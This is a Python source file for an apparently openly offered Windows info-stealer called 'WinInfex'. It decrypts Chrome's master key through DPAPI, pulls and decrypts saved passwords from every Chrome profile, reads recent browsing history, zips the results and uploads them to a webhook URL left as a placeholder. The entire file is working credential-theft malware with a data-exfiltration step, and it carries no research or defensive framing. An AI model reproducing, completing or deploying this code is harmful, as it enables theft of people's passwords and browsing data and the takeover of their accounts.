import os
import json
import base64
import shutil
import sqlite3
import requests
from Cryptodome.Cipher import AES
import tempfile
import zipfile
import ctypes
import ctypes.wintypes
import traceback
from colorama import Fore


def get_chrome_local_state():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Local State')
    print(f"Reading Local State: {local_state_path}")
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

    CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
    p_data_in = DATA_BLOB(len(encrypted_key))
    p_data_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_byte))
    p_data_in.cbData = len(encrypted_key)

    p_data_out = DATA_BLOB()
    if not CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
        raise Exception("DPAPI decryption failed")
    pointer = p_data_out.pbData
    length = p_data_out.cbData
    buffer = ctypes.string_at(pointer, length)
    ctypes.windll.kernel32.LocalFree(pointer)
    print("Master key decrypted")
    return buffer

def decrypt_password(encrypted_password, master_key):
    try:
        if isinstance(encrypted_password, memoryview):
            encrypted_password = encrypted_password.tobytes()

        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_pass.decode()
        else:
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

            CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
            p_data_in = DATA_BLOB(len(encrypted_password))
            p_data_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_password, len(encrypted_password)), ctypes.POINTER(ctypes.c_byte))
            p_data_in.cbData = len(encrypted_password)

            p_data_out = DATA_BLOB()
            if not CryptUnprotectData(ctypes.byref(p_data_in), None, None, None, None, 0, ctypes.byref(p_data_out)):
                raise Exception("DPAPI decryption failed")
            pointer = p_data_out.pbData
            length = p_data_out.cbData
            buffer = ctypes.string_at(pointer, length)
            ctypes.windll.kernel32.LocalFree(pointer)
            return buffer.decode()
    except Exception as e:
        return f"[Decryption failed: {str(e)}]"

def extract_passwords():
    master_key = get_chrome_local_state()

    user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    print("Available profiles:")
    profile_folders = []
    for folder in os.listdir(user_data_dir):
        full_path = os.path.join(user_data_dir, folder)
        if os.path.isdir(full_path) and (folder.startswith('Default') or folder.startswith('Profile')):
            print(f" - {folder}")
            profile_folders.append(folder)

    passwords = []

    for profile in profile_folders:
        login_db_path = os.path.join(user_data_dir, profile, 'Login Data')
        if os.path.exists(login_db_path):
            print(Fore.LIGHTRED_EX + f"Found Login Data for profile: {profile}")

            
            temp_db = os.path.join(tempfile.gettempdir(), f"ChromeLoginDataCopy_{profile}.db")
            shutil.copy2(login_db_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                passwords.append((url, username, decrypted_password))

            cursor.close()
            conn.close()

            os.remove(temp_db)

    return passwords

def save_passwords_to_file(passwords, filepath):
    with open(filepath, "w", encoding="utf-8") as f:
        for url, user, pwd in passwords:
            f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n{'-'*40}\n")
            
            
def extract_history():
    user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    history_entries = []

    for folder in os.listdir(user_data_dir):
        full_path = os.path.join(user_data_dir, folder)
        if os.path.isdir(full_path) and (folder.startswith('Default') or folder.startswith('Profile')):
            history_db_path = os.path.join(full_path, 'History')
            if os.path.exists(history_db_path):
                print(Fore.LIGHTRED_EX + f"Found History in: {folder}")
                temp_history = os.path.join(tempfile.gettempdir(), f"ChromeHistoryCopy_{folder}.db")
                shutil.copy2(history_db_path, temp_history)

                try:
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        history_entries.append((url, title))
                    cursor.close()
                    conn.close()
                except Exception as e:
                    print(f"Error reading history: {e}")
                finally:
                    os.remove(temp_history)
    return history_entries

def save_history_to_file(history, filepath):
    with open(filepath, "w", encoding="utf-8") as f:
        for url, title in history:
            f.write(f"Title: {title}\nURL: {url}\n{'-'*40}\n")


def zip_file(file_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(file_path, arcname=os.path.basename(file_path))

def send_to_webhook(file_path, webhook_url):
    with open(file_path, 'rb') as f:
        files = {
            "file": (os.path.basename(file_path), f)
        }
        data = {
            "content": "WinInfex"
        }
        response = requests.post(webhook_url, data=data, files=files)
        return response.status_code in (200, 204)

def main():
    try:
        print(Fore.LIGHTRED_EX + "WinInfex")
        passwords = extract_passwords()
        history = extract_history()

        print(Fore.LIGHTRED_EX + f"Total passwords: {len(passwords)}")
        print(Fore.LIGHTRED_EX + f"Total history entries: {len(history)}")

        if not passwords and not history:
            print("Nothing found.")
            return

        temp_folder = os.path.join(tempfile.gettempdir(), "WinInfex")
        os.makedirs(temp_folder, exist_ok=True)

        output_pass_file = os.path.join(temp_folder, "passwords.txt")
        output_hist_file = os.path.join(temp_folder, "history.txt")
        output_zip = os.path.join(temp_folder, "WinInfex.zip")

        if passwords:
            save_passwords_to_file(passwords, output_pass_file)
        if history:
            save_history_to_file(history, output_hist_file)

        with zipfile.ZipFile(output_zip, 'w') as zipf:
            if os.path.exists(output_pass_file):
                zipf.write(output_pass_file, arcname="passwords.txt")
            if os.path.exists(output_hist_file):
                zipf.write(output_hist_file, arcname="history.txt")

        print(Fore.LIGHTRED_EX + f"Saved in: {output_zip}" + Fore.RESET)

        webhook_url = "YOUR_WEBHOOK"

        if send_to_webhook(output_zip, webhook_url):
            print("Data sent")
        else:
            print("Error")

    except Exception:
        print("Error:")
        traceback.print_exc()
        os._exit(0)

if __name__ == "__main__":
    main()
